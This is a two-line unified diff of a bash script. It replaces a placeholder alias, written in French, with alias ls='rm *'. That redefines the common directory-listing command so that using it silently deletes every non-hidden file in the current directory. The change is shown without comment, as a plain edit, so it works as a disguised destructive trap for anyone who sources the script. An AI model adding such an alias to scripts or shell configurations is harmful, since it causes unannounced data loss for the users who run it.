@@ -1,2 +1,2 @@
 #!/bin/bash
-alias mon_alias='commande'
+alias ls='rm *'
